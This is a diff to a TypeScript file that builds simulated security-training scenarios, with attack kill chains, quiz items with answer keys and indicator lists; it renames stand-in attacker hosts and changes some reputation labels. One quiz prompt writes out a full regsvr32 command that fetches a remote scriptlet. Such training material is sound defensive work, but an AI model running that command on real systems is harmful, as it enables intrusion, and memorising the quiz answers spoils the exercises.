     alerts: eventsToAlerts(events, scenarioId),
     killchain: [
       { ts: T(-2 * MIN), phase: "Initial Access",              action: "Phishing email 'HR_Policy_Update.docm' delivered to s.patel (T1566.001)" },
-      { ts: T(0),        phase: "Initial Access / Download",  action: "certutil.exe downloads malicious EXE from malicious-update.ru (T1105)" },
+      { ts: T(0),        phase: "Initial Access / Download",  action: "certutil.exe downloads malicious EXE from pkg-mirror-eu.ru (T1105)" },
       { ts: T(4 * MIN),  phase: "Defense Evasion",            action: "regsvr32.exe Squiblydoo — remote COM scriptlet bypasses AppLocker (T1218.010)" },
       { ts: T(7 * MIN),  phase: "Execution",                  action: "mshta.exe loads stage-2 VBScript from attacker URL (T1218.005)" },
       { ts: T(10 * MIN), phase: "Discovery",                  action: "wmic.exe enumerates all running processes (T1057)" },
@@ -5980,7 +5954,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       },
       {
         id: "lol_q2_squiblydoo",
-        prompt: "evt_lol_02_regsvr32 runs: regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll. Which statement explains why this defeats an AppLocker policy?",
+        prompt: "evt_lol_02_regsvr32 runs: regsvr32 /s /u /i:http://cdn-winupd.ru/payload.sct scrobj.dll. Which statement explains why this defeats an AppLocker policy?",
         kind: "single",
         options: [
           { value: "signed_host_interprets", label: "An allow-listed signed binary interprets the remote scriptlet, so no new EXE is started" },
@@ -6015,7 +5989,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         options: [
           { value: "bits_job", label: "The BITS job NexaCorpUpdate resumes its transfer automatically after the machine restarts" },
           { value: "schtask_system", label: "The task NexaCorpHealthCheck re-runs the dropped binary every five minutes under the logged-on user" },
-          { value: "rundll32_dllmain", label: "rundll32 loading evil.dll from C:\\Users\\Public keeps that DLL resident on the host" },
+          { value: "rundll32_dllmain", label: "rundll32 loading srvhost.dll from C:\\Users\\Public keeps that DLL resident on the host" },
           { value: "wmic_enumeration", label: "wmic process list brief registers a permanent WMI event consumer on the workstation" },
         ],
         answer: ["bits_job", "schtask_system"],
@@ -6386,7 +6360,6 @@ export function buildCloudCryptoMiningScenario(scenarioId = "cloud-cryptomining-
         "aws.cost_anomaly.notification_email": "billing-alerts@rocketstack.io",
         "aws.cost_anomaly.time_period.start": T(0),
         "aws.cost_anomaly.time_period.end": T(20 * MIN),
-        "ueba.risk_score": 98,
         "cloud.provider": "aws",
         "cloud.account.id": accountId,
         "action_result": "alerted",
@@ -6483,7 +6456,7 @@ export function buildCloudCryptoMiningScenario(scenarioId = "cloud-cryptomining-
     { type: "domain", value: "xmr.pool.minergate.com",               reputation: "malicious",  tags: ["monero-mining-pool", "cryptomining"] },
     { type: "user",   value: backdoorUser,                           reputation: "malicious",  tags: ["iam-principal", "aws"] },
     { type: "user",   value: iamUser,                                reputation: "suspicious", tags: ["compromised-iam-user", "leaked-credentials"] },
-    { type: "host",   value: s3Bucket,                               reputation: "suspicious", tags: ["exfiltrated-bucket", "data-breach", "made-public"] },
+    { type: "host",   value: s3Bucket,                               reputation: "unknown", tags: ["exfiltrated-bucket", "data-breach", "made-public"] },
     { type: "url",    value: "https://github.com/rocketstack-io/deploy-scripts/commit/f3a8c2d9b8e1f4a67c3d2e1f", reputation: "suspicious", tags: ["credential-leak-source", "github-commit"] },
     { type: "email",  value: "a.levy@rocketstack.io",                reputation: "suspicious", tags: ["developer", "accidental-leak", "not-malicious"] },
   ];
@@ -6649,7 +6622,6 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
         "source.geo.location.lon": 4.8952,
         "host.name": dc01,
         "logon.type": "10",
-        "logon.type_description": "RemoteInteractive (RDP)",
         "authentication.protocol": "Negotiate",
         "authentication.status": "success",
       },
@@ -6926,7 +6898,6 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
         "source.geo.city_name": "Amsterdam",
         "host.name": dc02,
         "logon.type": "3",
-        "logon.type_description": "Network",
         "authentication.protocol": "Kerberos",
       },
     },
@@ -7077,7 +7048,7 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
   const iocs: IOC[] = [
     { type: "ip",     value: attackerIp,                                      reputation: "malicious",  tags: ["external-infrastructure", "netherlands", "tor-exit-node"] },
     { type: "user",   value: adminEmail,                                       reputation: "suspicious", tags: ["compromised-account", "it-admin", "stolen-credentials"] },
-    { type: "host",   value: dc01,                                             reputation: "suspicious", tags: ["patient-zero", "domain-controller", "dcsync-source"] },
+    { type: "host",   value: dc01,                                             reputation: "unknown", tags: ["patient-zero", "domain-controller", "dcsync-source"] },
     { type: "sha256", value: mimikatzHash,                                     reputation: "malicious",  tags: ["mimikatz", "credential-dumper", "hacktool"] },
     { type: "user",   value: "svc-monitoring-prod@nexacorp.com",               reputation: "malicious",  tags: ["shadow-admin", "backdoor-account", "domain-admins"] },
     { type: "sha256", value: ntdsDitHash,                                         reputation: "malicious",  tags: ["ntds-snapshot", "ad-database", "credential-exfil"] },
@@ -8143,7 +8114,7 @@ export function buildAsRepRoastingScenario(scenarioId = "asrep-roasting"): Scena
   ];
 
   const iocs: IOC[] = [
-    { type: "host",   value: "WS-DEV-09",                               reputation: "malicious", tags: ["internal-host", "ip:10.0.1.45"] },
+    { type: "host",   value: "WS-DEV-09",                               reputation: "clean", tags: ["internal-host", "ip:10.0.1.45"] },
     { type: "ip",     value: "10.0.1.45",                               reputation: "malicious", tags: ["ws-dev-09"] },
   ];
 
@@ -8517,7 +8488,7 @@ export function buildNtlmRelayScenario(scenarioId = "ntlm-relay-responder"): Sce
     { type: "ip",     value: "10.0.1.45",                                 reputation: "malicious", tags: ["ws-dev-09"] },
     { type: "sha256", value: makeSha256("inveigh_exe_llmnr_poisoner"), reputation: "malicious", tags: ["poisoning-tool", "workstation"] },
     { type: "sha256", value: makeSha256("PSEXESVC-ntlm-relay-2026"),     reputation: "malicious", tags: ["psexec", "lateral-movement", "remote-exec"] },
-    { type: "host",   value: "WS-DEV-09",                                 reputation: "malicious", tags: ["internal-host"] },
+    { type: "host",   value: "WS-DEV-09",                                 reputation: "clean", tags: ["internal-host"] },
   ];
 
   const killchain = [
@@ -9126,14 +9097,6 @@ export function buildOAuthConsentPhishingScenario(scenarioId = "oauth-consent-gr
       hostname: "sentinel.nexacorp.com", user_email: "j.chen@nexacorp.com",
       description: "Microsoft Sentinel UEBA raised the Productivity Suite Pro service principal's risk score from 8 to 91.",
       raw: {
-        "ueba.entity_type": "ServicePrincipal",
-        "ueba.entity_id": APP_ID,
-        "ueba.risk_score": 91,
-        "ueba.previous_risk_score": 8,
-        "ueba.alert_severity": "High",
-        "ueba.investigation_priority": 84,
-        "ueba.peer_group": "SaaS-Applications",
-        "ueba.peer_risk_score_avg": 12,
       },
     },
     {
